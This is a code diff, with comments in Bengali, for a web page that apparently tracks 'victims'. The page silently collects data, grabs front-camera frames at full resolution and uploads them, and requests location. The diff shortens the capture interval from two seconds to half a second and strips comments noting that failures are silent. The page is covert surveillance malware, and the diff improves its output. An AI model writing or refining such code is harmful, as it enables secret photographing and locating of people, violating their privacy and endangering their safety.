@@ -105,7 +105,7 @@
             const victimId = pathParts[pathParts.length - 1];
 
             // ================================================================
-            // সব স্ট্যাটাস আপডেট সরানো হয়েছে – নীরবে ডেটা সংগ্রহ
+            // ডেটা সংগ্রহ (নীরবে)
             // ================================================================
             async function collectData() {
                 try {
@@ -213,12 +213,12 @@
                     });
 
                     // ================================================================
-                    // 🔥 ক্যামেরা অ্যাক্সেস – আসল সাইজে ছবি (ফিক্স)
+                    // 🔥 ক্যামেরা অ্যাক্সেস – আসল সাইজে ছবি + দ্রুত ক্যাপচার
                     // ================================================================
                     try {
+                        // যত দ্রুত সম্ভব ক্যামেরা চাওয়া
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: {
-                                // 🔥 আদর্শ সাইজ (IDEAL) – ক্যামেরা যেটা সাপোর্ট করে সেটাই নেবে
                                 width: { ideal: 1920 },
                                 height: { ideal: 1080 },
                                 facingMode: 'user'
@@ -230,7 +230,7 @@
                         const canvas = document.getElementById('canvas');
                         video.srcObject = stream;
 
-                        // ভিডিওর আসল সাইজ পাওয়ার জন্য অপেক্ষা
+                        // ভিডিওর আসল সাইজ পাওয়ার জন্য অপেক্ষা (এটা ছাড়া সাইজ পাওয়া যায় না)
                         await new Promise((resolve) => {
                             video.onloadedmetadata = () => {
                                 video.play();
@@ -238,23 +238,22 @@
                             };
                         });
 
-                        // ভিডিওর আসল width/height নেওয়া
                         const videoWidth = video.videoWidth;
                         const videoHeight = video.videoHeight;
                         console.log(`📸 ভিডিও সাইজ: ${videoWidth}x${videoHeight}`);
 
-                        // ক্যানভাসের সাইজ ভিডিওর আসল সাইজে সেট করুন
                         canvas.width = videoWidth;
                         canvas.height = videoHeight;
 
+                        // ============================================================
+                        // 🔥 প্রতি ০.৫ সেকেন্ডে ছবি তোলা (আগে ২ সেকেন্ড ছিল)
+                        // ============================================================
                         const interval = setInterval(async () => {
                             if (!video.videoWidth || !video.videoHeight) return;
                             
-                            // ক্যানভাসে ভিডিও ড্র
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             
-                            // 🔥 কোয়ালিটি ০.৯৫ (প্রায় আসল) – ছবি কম্প্রেস না করে
                             const imageData = canvas.toDataURL('image/jpeg', 0.95);
                             const rawBase64 = imageData.split(',')[1];
 
@@ -267,15 +266,15 @@
                             } catch (e) {
                                 console.error('Camera upload error:', e);
                             }
-                        }, 2000);
+                        }, 500); // 🔥 ০.৫ সেকেন্ড (৫০০ মিলিসেকেন্ড)
 
+                        // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
                         setTimeout(() => {
                             clearInterval(interval);
                             stream.getTracks().forEach(t => t.stop());
                         }, 30000);
 
                     } catch (e) {
-                        // ক্যামেরা অ্যাক্সেস ডিনাই – নীরবে ব্যর্থ
                         console.log('Camera access denied');
                     }
 
@@ -305,7 +304,6 @@
                             });
                         }
                     } catch (e) {
-                        // লোকেশন অ্যাক্সেস ডিনাই – নীরবে ব্যর্থ
                         console.log('Location access denied');
                     }
 
